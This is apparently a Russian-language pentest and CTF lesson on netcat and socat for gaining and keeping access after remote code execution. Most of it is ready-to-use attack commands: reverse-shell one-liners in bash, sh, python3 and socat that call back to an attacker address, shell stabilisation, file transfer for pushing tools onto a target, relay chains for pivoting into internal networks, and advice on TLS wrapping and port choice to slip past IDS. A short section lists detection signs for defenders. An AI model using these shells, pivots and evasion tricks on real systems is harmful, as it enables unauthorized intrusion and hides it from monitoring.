## Задача

Когда у тебя есть выполнение команды на сервере, нужен канал, чтобы им пользоваться. HTTP-инструменты тут не помогут: нужен «сырой» TCP. **netcat** (`nc`) — швейцарский нож: он умеет слушать порт, подключаться, передавать данные. **socat** — его старший брат: умеет то же, но ещё релеи, туннели и PTY.

Разберём на живом примере: у нас есть RCE и мы хотим устойчивую обратную оболочку.

## Данные, с которыми работаем

Атакующий хост — `10.10.14.7`. На цели (после эксплуатации) мы можем выполнять команды. Сначала потренируемся локально: поднимем слушатель и подключимся к нему.

```bash
$ nc -lvnp 9911
Listening on 0.0.0.0 9911
Connection received on 127.0.0.1 41038
GET / HTTP/1.1
Host: x
```

Разберём флаги: `-l` — слушать, `-v` — показывать подробности, `-n` — не разрешать имена (быстрее), `-p` — порт. Всё, что придёт на порт, печатается в терминал — это и есть «сырое» соединение.

## Шаг 1: reverse shell

**Reverse shell** — обратная оболочка: цель сама подключается к нам, а мы получаем её командный интерпретатор. Это надёжнее **bind shell** (где мы подключаемся к открытому на цели порту), потому что исходящие соединения обычно не блокируются.

На нашей стороне — слушатель:

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

На цели выполняем одну из команд (зависит от того, что есть):

```bash
# bash
bash -i >& /dev/tcp/10.10.14.7/4444 0>&1
# sh
sh -i >& /dev/tcp/10.10.14.7/4444 0>&1
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```

У нас в терминале:

```text
Connection received on 10.10.14.7 51520
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Оболочка пришла. Она «тупая» — без истории, стрелок и Ctrl-C, поэтому дальше её **стабилизируют** (TTY через `python3 -c 'import pty;pty.spawn("/bin/bash")'`).

## Шаг 2: HTTP руками через nc

Иногда полезно поговорить с сервером без curl — просто отправив сырой запрос. Так видно каждый байт:

```bash
$ printf 'GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n' | nc -w3 target 80
HTTP/1.1 200 OK
Server: nginx
Content-Length: 612
...
```

`-w3` — таймаут 3 секунды. Тот же приём используют в **SSRF через gopher**: когда сервер сам открывает TCP-соединение, мы заставляем его послать наш текст на внутренний сервис.

## Шаг 3: баннер-граббинг и порт-скан

nc умеет быстро проверять порты и читать баннеры:

```bash
$ nc -zv 10.10.10.42 20-25 2>&1 | grep succeeded
Connection to 10.10.10.42 22 port [tcp/ssh] succeeded!
$ printf '\r\n' | nc -w2 10.10.10.42 22
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
```

`-z` — режим сканирования (не отправлять данные), `-v` — печатать успешные. Баннер `SSH-2.0-OpenSSH_8.9p1` сразу говорит о версии сервиса.

## Шаг 4: передача файлов

Перекинуть файл без scp можно так. Принимающая сторона слушает и пишет в файл:

```bash
$ nc -lvnp 9001 > received.bin
```

Отправляющая — подключается и отдаёт:

```bash
$ nc 10.10.14.7 9001 < file.bin
```

## Шаг 5: socat — когда nc мало

**socat** мощнее: он соединяет два «канала» и умеет PTY, SSL, релеи. Полноценная оболочка в одну команду:

```bash
# на атакующем — слушатель с PTY
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
# на цели — подключение
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.7:4444
```

Тут `pty` даёт настоящий терминал (стрелки, Ctrl-C), а `raw,echo=0` на нашей стороне — интерактивность. **Релей** (порт-форвард) для доступа к внутреннему сервису:

```bash
# локально 8080 -> внутренний web 10.10.10.5:80
$ socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80
```

`fork` — обслуживать несколько соединений одновременно.

## Шаг 6: socat с TLS и нестандартными каналами

socat умеет оборачивать канал в TLS — удобно, когда сырой TCP виден IDS. Простейший слушатель с
сертификатом:

```bash
$ socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork -
```

Здесь `OPENSSL-LISTEN` — тот же `TCP-LISTEN`, но с шифрованием, `cert` — сертификат (годится
самоподписанный), `verify=0` — не требовать клиентский сертификат. Клиент подключается так:

```bash
$ socat OPENSSL:10.10.14.7:4443,verify=0 -
```

socat соединяет **любые** два канала: `EXEC:` (запустить программу), `FILE:` (файл/устройство),
`PTY:` (псевдотерминал), `UDP:`/`UDP-LISTEN:`, `UNIX-CONNECT:`. Отсюда его гибкость: например,
`UDP-LISTEN` для датаграммных протоколов, которые `nc` обслуживает хуже.

## Шаг 7: цепочка релеев для пивота

Когда до внутреннего сервиса не дотянуться напрямую, socat строит цепочку. Допустим, у нас есть
доступ к хосту `10.10.10.20` (внутренний сегмент), но `10.10.10.50:3306` (MySQL) закрыт снаружи. На
промежуточном хосте поднимаем релей:

```bash
# на 10.10.10.20: слушаем 9000 и шлём на внутренний MySQL
$ socat TCP-LISTEN:9000,fork TCP:10.10.10.50:3306
```

Теперь с нашей стороны подключаемся к `10.10.10.20:9000` — и попадаем на MySQL `10.10.10.50`.
`fork` обязателен, иначе релей обслужит одно соединение и завершится. Для нескольких сервисов
поднимают несколько релеев на разных портах; для полноценного SOCKS-прокси лучше подходит `ssh -D`
или `chisel`.

## Как это видят защитники

Слушатели и реверс-оболочки — активные действия, и сеть их замечает. Признаки:

- **исходящее соединение на нестандартный порт** (`4444`, `9001`) с рабочего сервера — типичный
  reverse shell;
- **процесс `nc`/`socat`** в дереве процессов веб-сервера — аномалия (веб-сервер не должен запускать
  `nc`);
- **долгоживущее TCP-соединение** от внутреннего хоста наружу — канал управления;
- **`/dev/tcp`** в аргументах командной строки — прямой маркер bash-reverse-shell.

Для атакующего это значит: выбирай порты, похожие на легитимные (443/80), и сразу стабилизируй
оболочку, чтобы она не выглядела «висящим» процессом. На защите те же признаки — хорошие правила
детекта.

## Шпаргалка

| Задача | netcat | socat |
|--------|--------|-------|
| Слушать порт | `nc -lvnp 4444` | `socat - TCP-LISTEN:4444` |
| Подключиться | `nc host 80` | `socat - TCP:host:80` |
| Reverse shell | `bash -i >& /dev/tcp/IP/P 0>&1` | `socat exec:'bash -li',pty tcp:IP:P` |
| Передать файл | `nc -l 9001 > f` / `nc IP 9001 < f` | `socat -u FILE:f TCP-LISTEN:9001` |
| Порт-скан | `nc -zv host 20-25` | — (для скана лучше nmap) |
| Релей | — | `socat TCP-LISTEN:8080,fork TCP:inner:80` |
| PTY-оболочка | стабилизация вручную | `exec:'bash -li',pty` |

## Полный прогон от начала до конца

1. На атакующем: `nc -lvnp 4444` — слушаем.
2. На цели (после RCE): `bash -i >& /dev/tcp/10.10.14.7/4444 0>&1`.
3. У нас: `Connection received`, `id` → `uid=33(www-data)`.
4. Стабилизируем: `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
5. Для внутреннего сервиса: `socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80`.

## Частые ошибки

- **Слушатель на неправильном интерфейсе.** `-l` без `-p` иногда поднимает не то; явно указывай порт.
- **Порядок `-lvnp`.** Флаги можно собирать вместе, но `-p` требует значения рядом.
- **Reverse shell без `/dev/tcp`.** В `sh` (dash) нет `/dev/tcp` — используй python/perl/nc-варианты.
- **«Тупая» оболочка.** Без TTY нет интерактива; стабилизируй через pty.
- **socat без `fork`.** Обслужит одно соединение и умрёт.
- **Забыть `-w`/таймаут.** nc может висеть навсегда, если сервер не закрывает соединение.

## На что смотреть дальше

- **Reverse надёжнее bind.** Исходящие соединения реже фильтруются.
- **Стабилизируй оболочку сразу.** PTY превращает «тупую» оболочку в рабочую.
- **socat — для PTY и туннелей.** Когда нужен настоящий терминал или релей.
- **nc и в SSRF полезен.** Через gopher он превращает «fetch URL» в отправку произвольных байт.
- **Файлы — по nc.** Простой способ перенести инструмент на цель.
- **Только в рамках scope.** Слушатели и оболочки — активные действия; согласуй с координатором и
  фиксируй, что именно запустил, чтобы убрать за собой.

## Шаг 8: удобная оболочка — rlwrap и стабилизация

«Тупая» оболочка без истории и стрелок быстро раздражает. Два приёма делают её удобной:

- **Обернуть слушатель в `rlwrap`** — он добавляет историю и редактирование строки:
  ```bash
  $ rlwrap nc -lvnp 4444
  ```
- **Полноценный TTY на цели** — через Python:
  ```bash
  $ python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
  затем на нашей стороне `Ctrl-Z`, `stty raw -echo; fg` и `export TERM=xterm`. После этого работают
  стрелки, `Ctrl-C` и полноэкранные редакторы.

Если `python` нет, TTY поднимают через `script`/`socat`:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT`.

## Что выбрать: nc, socat или /dev/tcp

- **`nc`** — когда нужен минимум и он есть на цели. Быстрый слушатель, передача файлов, баннеры.
- **`/dev/tcp`** — когда нет `nc`, но есть `bash`. Не требует бинарников, живёт прямо в оболочке.
- **`socat`** — когда нужен PTY, TLS или релей. Мощнее, но есть не всегда.
- **`python3`** — когда нет ничего из перечисленного; один лайнер поднимает сокет и shell.

Правило: пробуй от простого к сложному, но **слушатель поднимай заранее** — иначе reverse-shell
придёт в пустоту и соединение оборвётся. И всегда проверяй, что оболочка «живая» (`id`, `pwd`), прежде
чем что-то делать.

Следующий урок (`web-tool-httpx-katana`) вернётся к вебу — как пробовать хосты и обходить приложение в поисках эндпоинтов. А пока главное запомни: `nc` и `socat` — это «сырой TCP»: слушатели, обратные оболочки, передача файлов, релеи; reverse-shell всегда стабилизируй через pty.

## Где пригодится

- **CTF (Web/Pwn/Network):** оболочки, передача эксплойтов и инструментов.
- **Пентест:** получение и стабилизация доступа после RCE.
- **Внутренний пентест:** релеи и туннели для доступа к внутренним сервисам.
- **Работа (DevOps):** быстрая проверка портов и баннеров без тяжёлых сканеров.
